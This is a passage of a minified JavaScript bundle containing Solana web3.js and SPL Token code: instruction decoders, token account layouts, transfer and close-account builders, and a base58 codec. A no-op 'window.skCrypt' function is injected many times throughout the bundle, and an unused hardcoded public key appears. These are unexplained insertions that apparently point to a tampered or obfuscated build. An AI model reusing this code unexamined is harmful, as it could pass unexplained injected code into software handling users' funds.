              fromPubkey: t.keys[0].pubkey,
              toPubkey: t.keys[1].pubkey,
              lamports: e,
            };
          }
          static decodeTransferWithSeed(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const {
              lamports: e,
              seed: n,
              programId: r,
            } = Ns(Ks.TransferWithSeed, t.data);
            return {
              fromPubkey: t.keys[0].pubkey,
              basePubkey: t.keys[1].pubkey,
              toPubkey: t.keys[2].pubkey,
              lamports: e,
              seed: n,
              programId: new Xi(r),
            };
          }
          static decodeAllocate(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 1);
            const { space: e } = Ns(Ks.Allocate, t.data);
            return { accountPubkey: t.keys[0].pubkey, space: e };
          }
          static decodeAllocateWithSeed(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 1);
            const {
              base: e,
              seed: n,
              space: r,
              programId: o,
            } = Ns(Ks.AllocateWithSeed, t.data);
            return {
              accountPubkey: t.keys[0].pubkey,
              basePubkey: new Xi(e),
              seed: n,
              space: r,
              programId: new Xi(o),
            };
          }
          static decodeAssign(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 1);
            const { programId: e } = Ns(Ks.Assign, t.data);
            return { accountPubkey: t.keys[0].pubkey, programId: new Xi(e) };
          }
          static decodeAssignWithSeed(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 1);
            const {
              base: e,
              seed: n,
              programId: r,
            } = Ns(Ks.AssignWithSeed, t.data);
            return {
              accountPubkey: t.keys[0].pubkey,
              basePubkey: new Xi(e),
              seed: n,
              programId: new Xi(r),
            };
          }
          static decodeCreateWithSeed(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 2);
            const {
              base: e,
              seed: n,
              lamports: r,
              space: o,
              programId: i,
            } = Ns(Ks.CreateWithSeed, t.data);
            return {
              fromPubkey: t.keys[0].pubkey,
              newAccountPubkey: t.keys[1].pubkey,
              basePubkey: new Xi(e),
              seed: n,
              lamports: r,
              space: o,
              programId: new Xi(i),
            };
          }
          static decodeNonceInitialize(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const { authorized: e } = Ns(Ks.InitializeNonceAccount, t.data);
            return {
              noncePubkey: t.keys[0].pubkey,
              authorizedPubkey: new Xi(e),
            };
          }
          static decodeNonceAdvance(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeyLength(t.keys, 3),
              Ns(Ks.AdvanceNonceAccount, t.data),
              {
                noncePubkey: t.keys[0].pubkey,
                authorizedPubkey: t.keys[2].pubkey,
              }
            );
          }
          static decodeNonceWithdraw(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 5);
            const { lamports: e } = Ns(Ks.WithdrawNonceAccount, t.data);
            return {
              noncePubkey: t.keys[0].pubkey,
              toPubkey: t.keys[1].pubkey,
              authorizedPubkey: t.keys[4].pubkey,
              lamports: e,
            };
          }
          static decodeNonceAuthorize(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 2);
            const { authorized: e } = Ns(Ks.AuthorizeNonceAccount, t.data);
            return {
              noncePubkey: t.keys[0].pubkey,
              authorizedPubkey: t.keys[1].pubkey,
              newAuthorizedPubkey: new Xi(e),
            };
          }
          static checkProgramId(t) {
            if (!t.equals(Fs.programId))
              throw new Error(
                "invalid instruction; programId is not SystemProgram"
              );
          }
          static checkKeyLength(t, e) {
            if (t.length < e)
              throw new Error(
                `invalid instruction; found ${t.length} keys, expected at least ${e}`
              );
          }
        },
        SystemProgram: Fs,
        Transaction: bs,
        TransactionExpiredBlockheightExceededError: Qi,
        TransactionExpiredNonceInvalidError: ts,
        TransactionExpiredTimeoutError: $i,
        TransactionInstruction: ws,
        TransactionMessage: vs,
        TransactionStatus: gs,
        VALIDATOR_INFO_KEY: pc,
        VERSION_PREFIX_MASK: Yi,
        VOTE_PROGRAM_ID: yc,
        ValidatorInfo: gc,
        VersionedMessage: ms,
        VersionedTransaction: As,
        VoteAccount: bc,
        VoteAuthorizationLayout: fc,
        VoteInit: lc,
        VoteInstruction: class {
          constructor() {}
          static decodeInstructionType(t) {
            this.checkProgramId(t.programId);
            const e = Cr.u32("instruction").decode(t.data);
            let n;
            for (const [r, o] of Object.entries(dc))
              if (o.index == e) {
                n = r;
                break;
              }
            if (!n)
              throw new Error(
                "Instruction type incorrect; not a VoteInstruction"
              );
            return n;
          }
          static decodeInitializeAccount(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 4);
            const { voteInit: e } = Ns(dc.InitializeAccount, t.data);
            return {
              votePubkey: t.keys[0].pubkey,
              nodePubkey: t.keys[3].pubkey,
              voteInit: new lc(
                new Xi(e.nodePubkey),
                new Xi(e.authorizedVoter),
                new Xi(e.authorizedWithdrawer),
                e.commission
              ),
            };
          }
          static decodeAuthorize(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const { newAuthorized: e, voteAuthorizationType: n } = Ns(
              dc.Authorize,
              t.data
            );
            return {
              votePubkey: t.keys[0].pubkey,
              authorizedPubkey: t.keys[2].pubkey,
              newAuthorizedPubkey: new Xi(e),
              voteAuthorizationType: { index: n },
            };
          }
          static decodeAuthorizeWithSeed(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const {
              voteAuthorizeWithSeedArgs: {
                currentAuthorityDerivedKeyOwnerPubkey: e,
                currentAuthorityDerivedKeySeed: n,
                newAuthorized: r,
                voteAuthorizationType: o,
              },
            } = Ns(dc.AuthorizeWithSeed, t.data);
            return {
              currentAuthorityDerivedKeyBasePubkey: t.keys[2].pubkey,
              currentAuthorityDerivedKeyOwnerPubkey: new Xi(e),
              currentAuthorityDerivedKeySeed: n,
              newAuthorizedPubkey: new Xi(r),
              voteAuthorizationType: { index: o },
              votePubkey: t.keys[0].pubkey,
            };
          }
          static decodeWithdraw(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const { lamports: e } = Ns(dc.Withdraw, t.data);
            return {
              votePubkey: t.keys[0].pubkey,
              authorizedWithdrawerPubkey: t.keys[2].pubkey,
              lamports: e,
              toPubkey: t.keys[1].pubkey,
            };
          }
          static checkProgramId(t) {
            if (!t.equals(hc.programId))
              throw new Error(
                "invalid instruction; programId is not VoteProgram"
              );
          }
          static checkKeyLength(t, e) {
            if (t.length < e)
              throw new Error(
                `invalid instruction; found ${t.length} keys, expected at least ${e}`
              );
          }
        },
        VoteProgram: hc,
        clusterApiUrl: function (t, e) {
          const n = !1 === e ? "http" : "https";
          if (!t) return Ic[n].devnet;
          const r = Ic[n][t];
          if (!r) throw new Error(`Unknown ${n} cluster: ${t}`);
          return r;
        },
        sendAndConfirmRawTransaction: async function (t, e, n, r) {
          let o, i;
          (n &&
            Object.prototype.hasOwnProperty.call(n, "lastValidBlockHeight")) ||
          (n && Object.prototype.hasOwnProperty.call(n, "nonceValue"))
            ? ((o = n), (i = r))
            : (i = n);
          const s = i && {
              skipPreflight: i.skipPreflight,
              preflightCommitment: i.preflightCommitment || i.commitment,
              minContextSlot: i.minContextSlot,
            },
            a = await t.sendRawTransaction(e, s),
            u = i && i.commitment,
            c = o ? t.confirmTransaction(o, u) : t.confirmTransaction(a, u),
            l = (await c).value;
          if (l.err) {
            if (null != a)
              throw new Ps({
                action: (null == s ? void 0 : s.skipPreflight)
                  ? "send"
                  : "simulate",
                signature: a,
                transactionMessage: `Status: (${JSON.stringify(l)})`,
              });
            throw new Error(
              `Raw transaction ${a} failed (${JSON.stringify(l)})`
            );
          }
          return a;
        },
        sendAndConfirmTransaction: Os,
      },
      Symbol.toStringTag,
      { value: "Module" }
    )
  );
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const _c = new Xi("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
    Tc = new Xi("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"),
    Cc = new Xi("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"),
    Bc = new Xi("So11111111111111111111111111111111111111112");
  new Xi("9pan9bMn5HatX4EJdBwg9VgCa7Uz5HL8N1m5D3NdXejP");
  const Ec = (t) => ({ decode: t.decode.bind(t), encode: t.encode.bind(t) });
  var xc,
    Pc = {};
  var Rc =
    (xc ||
      ((xc = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      }),
      Object.defineProperty(Pc, "__esModule", { value: !0 }),
      (Pc.toBigIntLE = function (t) {
        {
          const e = ct.from(t);
          e.reverse();
          const n = e.toString("hex");
          return 0 === n.length ? BigInt(0) : BigInt(`0x${n}`);
        }
      }),
      (Pc.toBigIntBE = function (t) {
        {
          const e = t.toString("hex");
          return 0 === e.length ? BigInt(0) : BigInt(`0x${e}`);
        }
      }),
      (Pc.toBufferLE = function (t, e) {
        {
          const n = t.toString(16),
            r = ct.from(n.padStart(2 * e, "0").slice(0, 2 * e), "hex");
          return r.reverse(), r;
        }
      }),
      (Pc.toBufferBE = function (t, e) {
        {
          const n = t.toString(16);
          return ct.from(n.padStart(2 * e, "0").slice(0, 2 * e), "hex");
        }
      })),
    Pc);
  const Oc =
    ((Mc = 8),
    (t) => {
      const e = Cr.blob(Mc, t),
        { encode: n, decode: r } = Ec(e),
        o = e;
      return (
        (o.decode = (t, e) => {
          const n = r(t, e);
          return Rc.toBigIntLE(ct.from(n));
        }),
        (o.encode = (t, e, r) => {
          const o = Rc.toBufferLE(t, Mc);
          return n(o, e, r);
        }),
        o
      );
    });
  var Mc;
  const Lc = (t) => {
      const e = Cr.u8(t),
        { encode: n, decode: r } = Ec(e),
        o = e;
      return (
        (o.decode = (t, e) => !!r(t, e)),
        (o.encode = (t, e, r) => {
          const o = Number(t);
          return n(o, e, r);
        }),
        o
      );
    },
    Nc = (t) => {
      const e = Cr.blob(32, t),
        { encode: n, decode: r } = Ec(e),
        o = e;
      return (
        (o.decode = (t, e) => {
          const n = r(t, e);
          return new Xi(n);
        }),
        (o.encode = (t, e, r) => {
          const o = t.toBuffer();
          return n(o, e, r);
        }),
        o
      );
    };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  class Dc extends Error {
    constructor(t) {
      super(t);
    }
  }
  class Uc extends Dc {
    constructor() {
      super(...arguments), (this.name = "TokenAccountNotFoundError");
    }
  }
  class qc extends Dc {
    constructor() {
      super(...arguments), (this.name = "TokenInvalidAccountError");
    }
  }
  class Wc extends Dc {
    constructor() {
      super(...arguments), (this.name = "TokenInvalidAccountOwnerError");
    }
  }
  class zc extends Dc {
    constructor() {
      super(...arguments), (this.name = "TokenInvalidAccountSizeError");
    }
  }
  class Kc extends Dc {
    constructor() {
      super(...arguments), (this.name = "TokenInvalidMintError");
    }
  }
  class Fc extends Dc {
    constructor() {
      super(...arguments), (this.name = "TokenOwnerOffCurveError");
    }
  }
  var jc, Gc, Vc, Hc;
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    ((Gc = jc || (jc = {}))[(Gc.InitializeMint = 0)] = "InitializeMint"),
    (Gc[(Gc.InitializeAccount = 1)] = "InitializeAccount"),
    (Gc[(Gc.InitializeMultisig = 2)] = "InitializeMultisig"),
    (Gc[(Gc.Transfer = 3)] = "Transfer"),
    (Gc[(Gc.Approve = 4)] = "Approve"),
    (Gc[(Gc.Revoke = 5)] = "Revoke"),
    (Gc[(Gc.SetAuthority = 6)] = "SetAuthority"),
    (Gc[(Gc.MintTo = 7)] = "MintTo"),
    (Gc[(Gc.Burn = 8)] = "Burn"),
    (Gc[(Gc.CloseAccount = 9)] = "CloseAccount"),
    (Gc[(Gc.FreezeAccount = 10)] = "FreezeAccount"),
    (Gc[(Gc.ThawAccount = 11)] = "ThawAccount"),
    (Gc[(Gc.TransferChecked = 12)] = "TransferChecked"),
    (Gc[(Gc.ApproveChecked = 13)] = "ApproveChecked"),
    (Gc[(Gc.MintToChecked = 14)] = "MintToChecked"),
    (Gc[(Gc.BurnChecked = 15)] = "BurnChecked"),
    (Gc[(Gc.InitializeAccount2 = 16)] = "InitializeAccount2"),
    (Gc[(Gc.SyncNative = 17)] = "SyncNative"),
    (Gc[(Gc.InitializeAccount3 = 18)] = "InitializeAccount3"),
    (Gc[(Gc.InitializeMultisig2 = 19)] = "InitializeMultisig2"),
    (Gc[(Gc.InitializeMint2 = 20)] = "InitializeMint2"),
    (Gc[(Gc.GetAccountDataSize = 21)] = "GetAccountDataSize"),
    (Gc[(Gc.InitializeImmutableOwner = 22)] = "InitializeImmutableOwner"),
    (Gc[(Gc.AmountToUiAmount = 23)] = "AmountToUiAmount"),
    (Gc[(Gc.UiAmountToAmount = 24)] = "UiAmountToAmount"),
    (Gc[(Gc.InitializeMintCloseAuthority = 25)] =
      "InitializeMintCloseAuthority"),
    (Gc[(Gc.TransferFeeExtension = 26)] = "TransferFeeExtension"),
    (Gc[(Gc.ConfidentialTransferExtension = 27)] =
      "ConfidentialTransferExtension"),
    (Gc[(Gc.DefaultAccountStateExtension = 28)] =
      "DefaultAccountStateExtension"),
    (Gc[(Gc.Reallocate = 29)] = "Reallocate"),
    (Gc[(Gc.MemoTransferExtension = 30)] = "MemoTransferExtension"),
    (Gc[(Gc.CreateNativeMint = 31)] = "CreateNativeMint"),
    (Gc[(Gc.InitializeNonTransferableMint = 32)] =
      "InitializeNonTransferableMint"),
    (Gc[(Gc.InterestBearingMintExtension = 33)] =
      "InterestBearingMintExtension"),
    (Gc[(Gc.CpiGuardExtension = 34)] = "CpiGuardExtension"),
    (Gc[(Gc.InitializePermanentDelegate = 35)] = "InitializePermanentDelegate"),
    (Gc[(Gc.TransferHookExtension = 36)] = "TransferHookExtension"),
    (Gc[(Gc.MetadataPointerExtension = 39)] = "MetadataPointerExtension"),
    (Gc[(Gc.GroupPointerExtension = 40)] = "GroupPointerExtension"),
    (Gc[(Gc.GroupMemberPointerExtension = 41)] = "GroupMemberPointerExtension"),
    (Gc[(Gc.ScaledUiAmountExtension = 43)] = "ScaledUiAmountExtension"),
    (Gc[(Gc.PausableExtension = 44)] = "PausableExtension"),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    ((Hc = Vc || (Vc = {}))[(Hc.Uninitialized = 0)] = "Uninitialized"),
    (Hc[(Hc.Mint = 1)] = "Mint"),
    (Hc[(Hc.Account = 2)] = "Account");
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Xc = Cr.struct([
    Cr.u8("m"),
    Cr.u8("n"),
    Lc("isInitialized"),
    Nc("signer1"),
    Nc("signer2"),
    Nc("signer3"),
    Nc("signer4"),
    Nc("signer5"),
    Nc("signer6"),
    Nc("signer7"),
    Nc("signer8"),
    Nc("signer9"),
    Nc("signer10"),
    Nc("signer11"),
  ]).span;
  var Zc, Jc;
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    ((Jc = Zc || (Zc = {}))[(Jc.Uninitialized = 0)] = "Uninitialized"),
    (Jc[(Jc.Initialized = 1)] = "Initialized"),
    (Jc[(Jc.Frozen = 2)] = "Frozen");
  const Yc = Cr.struct([
      Nc("mint"),
      Nc("owner"),
      Oc("amount"),
      Cr.u32("delegateOption"),
      Nc("delegate"),
      Cr.u8("state"),
      Cr.u32("isNativeOption"),
      Oc("isNative"),
      Oc("delegatedAmount"),
      Cr.u32("closeAuthorityOption"),
      Nc("closeAuthority"),
    ]),
    Qc = Yc.span;
  async function $c(t, e, n, r = _c) {
    return (function (t, e, n = _c) {
      if (!e) throw new Uc();
      if (!e.owner.equals(n)) throw new Wc();
      if (e.data.length < Qc) throw new zc();
      const r = Yc.decode(e.data.slice(0, Qc));
      let o = ct.alloc(0);
      if (e.data.length > Qc) {
        if (e.data.length === Xc) throw new zc();
        if (e.data[Qc] != Vc.Account) throw new qc();
        o = e.data.slice(Qc + 1);
      }
      return {
        address: t,
        mint: r.mint,
        owner: r.owner,
        amount: r.amount,
        delegate: r.delegateOption ? r.delegate : null,
        delegatedAmount: r.delegatedAmount,
        isInitialized: r.state !== Zc.Uninitialized,
        isFrozen: r.state === Zc.Frozen,
        isNative: !!r.isNativeOption,
        rentExemptReserve: r.isNativeOption ? r.isNative : null,
        closeAuthority: r.closeAuthorityOption ? r.closeAuthority : null,
        tlvData: o,
      };
    })(e, await t.getAccountInfo(e, n), r);
  }
  function tl(t, e, n) {
    if (n.length) {
      t.push({ pubkey: e, isSigner: !1, isWritable: !1 });
      for (const e of n)
        t.push({
          pubkey: e instanceof Xi ? e : e.publicKey,
          isSigner: !0,
          isWritable: !1,
        });
    } else t.push({ pubkey: e, isSigner: !0, isWritable: !1 });
    return t;
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  function el(t) {
    return Cr.struct(
      [Oc("epoch"), Oc("maximumFee"), Cr.u16("transferFeeBasisPoints")],
      t
    );
  }
  BigInt(1e4);
  const nl = Cr.struct([
    Nc("transferFeeConfigAuthority"),
    Nc("withdrawWithheldAuthority"),
    Oc("withheldAmount"),
    el("olderTransferFee"),
    el("newerTransferFee"),
  ]);
  nl.span;
  function rl(t) {
    const e = (function (t, e) {
      let n = 0;
      for (; ul(n) <= e.length; ) {
        const r = e.readUInt16LE(n),
          o = e.readUInt16LE(n + sl),
          i = ul(n);
        if (r == t) return e.slice(i, i + o);
        n = i + o;
      }
      return null;
    })(ol.TransferFeeConfig, t.tlvData);
    return null !== e ? nl.decode(e) : null;
  }
  var ol, il;
  Cr.struct([Oc("withheldAmount")]).span,
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    ((il = ol || (ol = {}))[(il.Uninitialized = 0)] = "Uninitialized"),
    (il[(il.TransferFeeConfig = 1)] = "TransferFeeConfig"),
    (il[(il.TransferFeeAmount = 2)] = "TransferFeeAmount"),
    (il[(il.MintCloseAuthority = 3)] = "MintCloseAuthority"),
    (il[(il.ConfidentialTransferMint = 4)] = "ConfidentialTransferMint"),
    (il[(il.ConfidentialTransferAccount = 5)] = "ConfidentialTransferAccount"),
    (il[(il.DefaultAccountState = 6)] = "DefaultAccountState"),
    (il[(il.ImmutableOwner = 7)] = "ImmutableOwner"),
    (il[(il.MemoTransfer = 8)] = "MemoTransfer"),
    (il[(il.NonTransferable = 9)] = "NonTransferable"),
    (il[(il.InterestBearingConfig = 10)] = "InterestBearingConfig"),
    (il[(il.CpiGuard = 11)] = "CpiGuard"),
    (il[(il.PermanentDelegate = 12)] = "PermanentDelegate"),
    (il[(il.NonTransferableAccount = 13)] = "NonTransferableAccount"),
    (il[(il.TransferHook = 14)] = "TransferHook"),
    (il[(il.TransferHookAccount = 15)] = "TransferHookAccount"),
    (il[(il.MetadataPointer = 18)] = "MetadataPointer"),
    (il[(il.TokenMetadata = 19)] = "TokenMetadata"),
    (il[(il.GroupPointer = 20)] = "GroupPointer"),
    (il[(il.TokenGroup = 21)] = "TokenGroup"),
    (il[(il.GroupMemberPointer = 22)] = "GroupMemberPointer"),
    (il[(il.TokenGroupMember = 23)] = "TokenGroupMember"),
    (il[(il.ScaledUiAmountConfig = 25)] = "ScaledUiAmountConfig"),
    (il[(il.PausableConfig = 26)] = "PausableConfig"),
    (il[(il.PausableAccount = 27)] = "PausableAccount");
  const sl = 2,
    al = 2;
  function ul(t) {
    return t + sl + al;
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const cl = Cr.struct([
      Cr.u32("mintAuthorityOption"),
      Nc("mintAuthority"),
      Oc("supply"),
      Cr.u8("decimals"),
      Lc("isInitialized"),
      Cr.u32("freezeAuthorityOption"),
      Nc("freezeAuthority"),
    ]),
    ll = cl.span;
  function dl(t, e, n = _c) {
    if (!e) throw new Uc();
    if (!e.owner.equals(n)) throw new Wc();
    if (e.data.length < ll) throw new zc();
    const r = cl.decode(e.data.slice(0, ll));
    let o = ct.alloc(0);
    if (e.data.length > ll) {
      if (e.data.length <= Qc) throw new zc();
      if (e.data.length === Xc) throw new zc();
      if (e.data[Qc] != Vc.Mint) throw new Kc();
      o = e.data.slice(Qc + 1);
    }
    return {
      address: t,
      mintAuthority: r.mintAuthorityOption ? r.mintAuthority : null,
      supply: r.supply,
      decimals: r.decimals,
      isInitialized: r.isInitialized,
      freezeAuthority: r.freezeAuthorityOption ? r.freezeAuthority : null,
      tlvData: o,
    };
  }
  async function fl(t, e, n = !1, r = _c, o = Cc) {
    if (!n && !Xi.isOnCurve(e.toBuffer())) throw new Fc();
    const [i] = await Xi.findProgramAddress(
      [e.toBuffer(), r.toBuffer(), t.toBuffer()],
      o
    );
    return i;
  }
  function hl(t, e, n = !1, r = _c, o = Cc) {
    if (!n && !Xi.isOnCurve(e.toBuffer())) throw new Fc();
    const [i] = Xi.findProgramAddressSync(
      [e.toBuffer(), r.toBuffer(), t.toBuffer()],
      o
    );
    return i;
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const pl = Cr.struct([Cr.u8("instruction")]);
  function ml(t, e, n, r = [], o = _c) {
    const i = tl(
        [
          { pubkey: t, isSigner: !1, isWritable: !0 },
          { pubkey: e, isSigner: !1, isWritable: !0 },
        ],
        n,
        r
      ),
      s = ct.alloc(pl.span);
    return (
      pl.encode({ instruction: jc.CloseAccount }, s),
      new ws({ keys: i, programId: o, data: s })
    );
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const gl = Cr.struct([Cr.u8("instruction")]);
  function yl(t, e, n, r = _c) {
    const o = [
        { pubkey: t, isSigner: !1, isWritable: !0 },
        { pubkey: e, isSigner: !1, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: Ts, isSigner: !1, isWritable: !1 },
      ],
      i = ct.alloc(gl.span);
    return (
      gl.encode({ instruction: jc.InitializeAccount }, i),
      new ws({ keys: o, programId: r, data: i })
    );
  }
  function wl(t, e, n, r, o = _c, i = Cc) {
    return vl(t, e, n, r, ct.alloc(0), o, i);
  }
  function bl(t, e, n, r, o = _c, i = Cc) {
    return vl(t, e, n, r, ct.from([1]), o, i);
  }
  function vl(t, e, n, r, o, i = _c, s = Cc) {
    const a = [
      { pubkey: t, isSigner: !0, isWritable: !0 },
      { pubkey: e, isSigner: !1, isWritable: !0 },
      { pubkey: n, isSigner: !1, isWritable: !1 },
      { pubkey: r, isSigner: !1, isWritable: !1 },
      { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
      { pubkey: i, isSigner: !1, isWritable: !1 },
    ];
    return new ws({ keys: a, programId: s, data: o });
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const Al = Cr.struct([Cr.u8("instruction")]);
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const kl = Cr.struct([Cr.u8("instruction"), Oc("amount")]);
  function Il(t, e, n, r, o = [], i = _c) {
    const s = tl(
        [
          { pubkey: t, isSigner: !1, isWritable: !0 },
          { pubkey: e, isSigner: !1, isWritable: !0 },
        ],
        n,
        o
      ),
      a = ct.alloc(kl.span);
    return (
      kl.encode({ instruction: jc.Transfer, amount: BigInt(r) }, a),
      new ws({ keys: s, programId: i, data: a })
    );
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Sl = globalThis || self;
  var _l, Tl, Cl, Bl;
  var El = (function () {
    if (Bl) return Cl;
    (Bl = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      });
    var t = (function () {
      if (Tl) return _l;
      (Tl = 1),
        (window.skCrypt = function (t) {
          return function () {
            return t;
          };
        });
      var t = nr().Buffer;
      return (
        (_l = function (e) {
          if (e.length >= 255) throw new TypeError("Alphabet too long");
          for (var n = new Uint8Array(256), r = 0; r < n.length; r++)
            n[r] = 255;
          for (var o = 0; o < e.length; o++) {
            var i = e.charAt(o),
              s = i.charCodeAt(0);
            if (255 !== n[s]) throw new TypeError(i + " is ambiguous");
            n[s] = o;
          }
          var a = e.length,
            u = e.charAt(0),
            c = Math.log(a) / Math.log(256),
            l = Math.log(256) / Math.log(a);
          function d(e) {
            if ("string" != typeof e) throw new TypeError("Expected String");
            if (0 === e.length) return t.alloc(0);
            for (var r = 0, o = 0, i = 0; e[r] === u; ) o++, r++;
            for (
              var s = ((e.length - r) * c + 1) >>> 0, l = new Uint8Array(s);
              r < e.length;

            ) {
              var d = e.charCodeAt(r);
              if (d > 255) return;
              var f = n[d];
              if (255 === f) return;
              for (
                var h = 0, p = s - 1;
                (0 !== f || h < i) && -1 !== p;
                p--, h++
              )
                (f += (a * l[p]) >>> 0),
                  (l[p] = f % 256 >>> 0),
                  (f = (f / 256) >>> 0);
              if (0 !== f) throw new Error("Non-zero carry");
              (i = h), r++;
            }
            for (var m = s - i; m !== s && 0 === l[m]; ) m++;
            var g = t.allocUnsafe(o + (s - m));
            g.fill(0, 0, o);
            for (var y = o; m !== s; ) g[y++] = l[m++];
            return g;
          }
          return {
            encode: function (n) {
              if (
                ((Array.isArray(n) || n instanceof Uint8Array) &&
                  (n = t.from(n)),
                !t.isBuffer(n))
              )
                throw new TypeError("Expected Buffer");
              if (0 === n.length) return "";
              for (
                var r = 0, o = 0, i = 0, s = n.length;
                i !== s && 0 === n[i];

              )
                i++, r++;
              for (
                var c = ((s - i) * l + 1) >>> 0, d = new Uint8Array(c);
                i !== s;

              ) {
                for (
                  var f = n[i], h = 0, p = c - 1;
                  (0 !== f || h < o) && -1 !== p;
                  p--, h++
                )
                  (f += (256 * d[p]) >>> 0),
                    (d[p] = f % a >>> 0),
                    (f = (f / a) >>> 0);
                if (0 !== f) throw new Error("Non-zero carry");
                (o = h), i++;
              }
              for (var m = c - o; m !== c && 0 === d[m]; ) m++;
              for (var g = u.repeat(r); m < c; ++m) g += e.charAt(d[m]);
              return g;
            },
            decodeUnsafe: d,
            decode: function (t) {
              var e = d(t);
              if (e) return e;
              throw new Error("Non-base" + a + " character");
            },
          };
        }),
        _l
      );
    })();
    return (Cl = t(
      "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    ));
  })();
  const xl = Un(El);
  var Pl,
    Rl = { exports: {} };
  var Ol = (function () {
    if (Pl) return Rl.exports;
    (Pl = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      });
    const t = /[\p{Lu}]/u,
      e = /[\p{Ll}]/u,
      n = /^[\p{Lu}](?![\p{Lu}])/gu,
      r = /([\p{Alpha}\p{N}_]|$)/u,
      o = /[_.\- ]+/,
      i = new RegExp("^" + o.source),
      s = new RegExp(o.source + r.source, "gu"),
      a = new RegExp("\\d+" + r.source, "gu"),
      u = (r, o) => {
        if ("string" != typeof r && !Array.isArray(r))
          throw new TypeError("Expected the input to be `string | string[]`");
        if (
          ((o = { pascalCase: !1, preserveConsecutiveUppercase: !1, ...o }),
          0 ===
            (r = Array.isArray(r)
              ? r
                  .map((t) => t.trim())
                  .filter((t) => t.length)
                  .join("-")
              : r.trim()).length)
        )
          return "";
        const u =
            !1 === o.locale
              ? (t) => t.toLowerCase()
              : (t) => t.toLocaleLowerCase(o.locale),
          c =
            !1 === o.locale
              ? (t) => t.toUpperCase()
              : (t) => t.toLocaleUpperCase(o.locale);
        if (1 === r.length) return o.pascalCase ? c(r) : u(r);
        return (
          r !== u(r) &&
            (r = ((n, r, o) => {
              let i = !1,
                s = !1,
                a = !1;
              for (let u = 0; u < n.length; u++) {
                const c = n[u];
                i && t.test(c)
                  ? ((n = n.slice(0, u) + "-" + n.slice(u)),
                    (i = !1),
                    (a = s),
                    (s = !0),
                    u++)
                  : s && a && e.test(c)
                  ? ((n = n.slice(0, u - 1) + "-" + n.slice(u - 1)),
                    (a = s),
                    (s = !1),
                    (i = !0))
                  : ((i = r(c) === c && o(c) !== c),
                    (a = s),
                    (s = o(c) === c && r(c) !== c));
              }
              return n;
            })(r, u, c)),
          (r = r.replace(i, "")),
          (r = o.preserveConsecutiveUppercase
            ? ((t, e) => ((n.lastIndex = 0), t.replace(n, (t) => e(t))))(r, u)
            : u(r)),
          o.pascalCase && (r = c(r.charAt(0)) + r.slice(1)),
          ((t, e) => (
            (s.lastIndex = 0),
            (a.lastIndex = 0),
            t.replace(s, (t, n) => e(n)).replace(a, (t) => e(t))
          ))(r, c)
        );
      };
    return (Rl.exports = u), (Rl.exports.default = u), Rl.exports;
  })();
  const Ml = Un(Ol);
  var Ll,
    Nl = {},
    Dl = {};
  function Ul() {
    if (Ll) return Dl;
    (Ll = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      });
    class t {
      constructor(t, e) {
        if (!Number.isInteger(t))
          throw new TypeError("span must be an integer");
        (this.span = t), (this.property = e);
      }
      makeDestinationObject() {
        return {};
      }
      decode(t, e) {
        throw new Error("Layout is abstract");
      }
      encode(t, e, n) {
        throw new Error("Layout is abstract");
      }
      getSpan(t, e) {
        if (0 > this.span) throw new RangeError("indeterminate span");
        return this.span;
      }
      replicate(t) {
        const e = Object.create(this.constructor.prototype);
        return Object.assign(e, this), (e.property = t), e;
      }
      fromArray(t) {}
    }
    function e(t, e) {
      return e.property ? t + "[" + e.property + "]" : t;
    }
    (Dl.Layout = t),
      (Dl.nameWithProperty = e),
      (Dl.bindConstructorLayout = function (e, n) {
        if ("function" != typeof e)
          throw new TypeError("Class must be constructor");
        if (e.hasOwnProperty("layout_"))
          throw new Error("Class is already bound to a layout");
        if (!(n && n instanceof t))
          throw new TypeError("layout must be a Layout");
        if (n.hasOwnProperty("boundConstructor_"))
          throw new Error("layout is already bound to a constructor");
        (e.layout_ = n),
          (n.boundConstructor_ = e),
          (n.makeDestinationObject = () => new e()),
          Object.defineProperty(e.prototype, "encode", {
            value: function (t, e) {
